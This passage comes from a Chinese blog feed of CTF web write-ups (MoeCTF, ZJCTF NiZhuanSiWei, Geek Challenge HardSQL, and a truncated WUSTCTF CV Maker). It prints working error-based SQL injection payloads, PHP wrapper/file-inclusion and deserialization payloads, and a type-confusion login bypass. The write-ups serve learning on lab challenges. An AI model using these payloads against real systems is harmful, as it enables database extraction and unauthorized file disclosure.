class="hljs-string">&quot;big&quot;</span>,signed=<span class="hljs-literal">True</span>).decode().translate(&#123;<span class="hljs-built_in">ord</span>(c):<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\x00&quot;</span>&#125;)) <span class="hljs-comment"># what is it?</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data:<span class="hljs-built_in">str</span></span>):<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>data = base64.b64encode(data).decode() <span class="hljs-comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br><span class="hljs-keyword">return</span> data<br>__page__ = base64.b64encode(<span class="hljs-string">&quot;PCFET0NU...KPC9odG1sPg==&quot;</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">try</span>:<br><span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/&quot;</span>:<br>self.send_response(<span class="hljs-number">200</span>)<br>self.end_headers()<br>self.wfile.write(__page__)<br><span class="hljs-keyword">else</span>:<br>self.send_response(<span class="hljs-number">404</span>)<br>self.end_headers()<br>self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><span class="hljs-built_in">print</span>(e)<br>self.send_response(<span class="hljs-number">500</span>)<br>self.end_headers()<br>self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">try</span>:<br><span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/login&quot;</span>:<br>body = self.rfile.read(<span class="hljs-built_in">int</span>(self.headers.get(<span class="hljs-string">&quot;Content-Length&quot;</span>)))<br>payload = json.loads(body)<br>params = json.loads(decrypt(payload[<span class="hljs-string">&quot;params&quot;</span>]))<br><span class="hljs-built_in">print</span>(params)<br><span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == <span class="hljs-string">&quot;admin&quot;</span>:<br>self.send_response(<span class="hljs-number">403</span>)<br>self.end_headers()<br>self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == params.get(<span class="hljs-string">&quot;password&quot;</span>):<br>self.send_response(<span class="hljs-number">403</span>)<br>self.end_headers()<br>self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;same&quot;</span>)<br><span class="hljs-keyword">return</span><br>hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))<br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br><span class="hljs-keyword">if</span> hashed == v:<br>data = &#123;<br><span class="hljs-string">&quot;user&quot;</span>:k,<br><span class="hljs-string">&quot;hash&quot;</span>:hashed,<br><span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>&#125;<br>self.send_response(<span class="hljs-number">200</span>)<br>self.end_headers()<br>self.wfile.write(json.dumps(data).encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br><span class="hljs-keyword">return</span><br>self.send_response(<span class="hljs-number">403</span>)<br>self.end_headers()<br>self.wfile.write(<span class="hljs-string">b&quot;Invalid username or password&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>self.send_response(<span class="hljs-number">404</span>)<br>self.end_headers()<br>self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><span class="hljs-built_in">print</span>(e)<br>self.send_response(<span class="hljs-number">500</span>)<br>self.end_headers()<br>self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>server = http.server.HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">9999</span>), MyHandler)<br>server.serve_forever()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))<br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br><span class="hljs-keyword">if</span> hashed == v:<br>data = &#123;<br><span class="hljs-string">&quot;user&quot;</span>:k,<br><span class="hljs-string">&quot;hash&quot;</span>:hashed,<br><span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>&#125;<br>self.send_response(<span class="hljs-number">200</span>)<br>self.end_headers()<br>self.wfile.write(json.dumps(data).encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br></code></pre></td></tr></table></figure><p>需要hashed&#x3D;&#x3D;v</p><p>hashed &#x3D; gethash(params.get(“username”),params.get(“password”))</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br><span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-keyword">continue</span><br>c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br></code></pre></td></tr></table></figure><p>异或操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items()<br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())<br><br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>hashed_users为{“admin”，0}，即k&#x3D;admin，v&#x3D;0，我们需要使hashed&#x3D;&#x3D;0，即异或我们传入的username和password，username&#x3D;&#x3D;password，但被限制username和password不能相等</p><p>这里我们就要利用字符和数字进行绕过，例如我们传入<code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:1&#125; </code>，二者类型不同所以不相等，但进行加盐哈希处理时会把数字当作字符串来处理，因此二者的<code>gethash</code>值为0，从而满足题目条件</p><h3 id="Web-出去旅游的心海"><a href="#Web-出去旅游的心海" class="headerlink" title="Web-出去旅游的心海"></a>Web-出去旅游的心海</h3><p>在源代码中发现wp-content&#x2F;plugins&#x2F;visitor-logging&#x2F;logger.php</p><p><img src="https://i.imgs.ovh/2023/10/10/XlHXC.png" alt="XlHXC.png"></p><p>用sqlmap爆出flag</p><p>爆数据库名：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">12</span>&amp;time=<span class="hljs-number">1</span> and updatexml(<span class="hljs-number">1</span>,concat(&#x27;^&#x27;,(database()),&#x27;^&#x27;),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>数据插入失败: XPATH syntax error: ‘^wordpress^’</p><p>爆表名：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">12</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;wordpress&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;^&#x27;</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>数据插入失败: XPATH syntax error: ‘^secret_of_kokomi^’</p><p>爆列名：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">12</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;secret_of_kokomi&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;wordpress&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;^&#x27;</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>数据插入失败: XPATH syntax error: ‘^content^’</p><p>爆数据：</p><p>报错注入有字符长度限制，所以这里要用right进行切割</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">12</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,right((<span class="hljs-keyword">select</span> group_concat(content)<span class="hljs-keyword">from</span> secret_of_kokomi),<span class="hljs-number">30</span>),<span class="hljs-string">&#x27;^&#x27;</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>数据插入失败: XPATH syntax error: ‘^ve2y_C0de_3nd_Poss1bIlIti3s!!}^’</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">12</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,right((<span class="hljs-keyword">select</span> group_concat(content)<span class="hljs-keyword">from</span> secret_of_kokomi),<span class="hljs-number">50</span>),<span class="hljs-string">&#x27;^&#x27;</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>数据插入失败: XPATH syntax error: ‘^moectf{Dig_Thr0ugh_Eve2y_C0de_3’</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf</title>
    <link href="/2023/08/06/%E5%88%B7%E9%A2%98/buuctf(web)/"/>
    <url>/2023/08/06/%E5%88%B7%E9%A2%98/buuctf(web)/</url>
    
    <content type="html"><![CDATA[<h2 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h2><p>知识点：</p><p>data:&#x2F;&#x2F;　　　　写入数据</p><p>php:&#x2F;&#x2F;input　　执行php</p><p>　　&#x2F;&#x2F;filter　　查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>　　我们需要get方式提交参数，text、file、password。</p><p>然后就是来到了第一个需要绕过的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))<br></code></pre></td></tr></table></figure><p>　　要求text不为空，这是肯定的，主要看下一句，file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”welcome to the zjctf”,从文件里读取字符串，还要和welcome to the zjctf相等。</p><p>这时候就用到了我们的data:&#x2F;&#x2F; 写入协议了</p><p>于是我们先构造第一个payload:?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p><p>下面我们不能用flag.php来访问，因为被正则匹配，我们就拿不到反序列化后的password了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>       <span class="hljs-keyword">exit</span>();<br>   &#125;<span class="hljs-keyword">else</span>&#123;<br>       <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>       <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>　　</p><p>下一个我们就该反序列化password了，但是我们又看到了useless.php文件包含，在这之前我们需要先读取里面的源码，然后将password反序列化出来。</p><p>于是我们构造第二个payload:file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p>这时候你会得到一串base64的编码，然后我们解码就得到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>　得到源码之后，我们将这个源码中的$file赋值flag.php，反序列化一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>　　然后可以找在线的php解释器执行一下，也可以用自己的phpstudy本地服务器运行一下，我因为又本地服务器，我就再本地服务器上面跑了一下，于是得到反序列化的password</p><p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>这样我们重新构造最终的payload:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome<span class="hljs-meta">%20to</span><span class="hljs-meta">%20the</span><span class="hljs-meta">%20zjctf</span>&amp;file=useless.php&amp;password=O:<span class="hljs-number">4</span>:<span class="hljs-meta">%22Flag</span><span class="hljs-meta">%22:1:</span>&#123;s:<span class="hljs-number">4</span>:<span class="hljs-meta">%22file</span><span class="hljs-meta">%22</span>;s:<span class="hljs-number">8</span>:<span class="hljs-meta">%22flag</span>.php<span class="hljs-meta">%22</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h2><p>sql注入题，先试试万能密码username&#x3D;<code>1&#39; or 1=1#</code><br>password&#x3D;123</p><p>经过一系列尝试后，发现空格，&#x3D;，union都被过滤了<br>空格被过滤我们使用()来代替空格 &#x2F;**&#x2F;貌似也被过滤了<br>既然如此，尝试一下报错注入</p><p><strong>爆库</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1</code></p><p><strong>爆表</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&amp;password=1</code></p><p><strong>爆字段</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#&amp;password=1</code></p><p><strong>爆值</strong><br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1</code></p><p>并没有成功显示flag，只显示了一半~<br>经过查询知道了right()可以查询后面的部分<br>payload：<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br>和前面显示出的flag拼接删改得到完整的flag</p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br><span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>)) &#123;<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$img_path</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;_Hz&quot;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br>    <span class="hljs-variable">$fn</span> = <span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;_Hz&quot;</span>]).<span class="hljs-string">&quot;.*&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$fn</span>)) &#123;<br>    <span class="hljs-variable">$ffn</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$fn</span>)[<span class="hljs-number">0</span>];<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$ffn</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>))&#123;<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    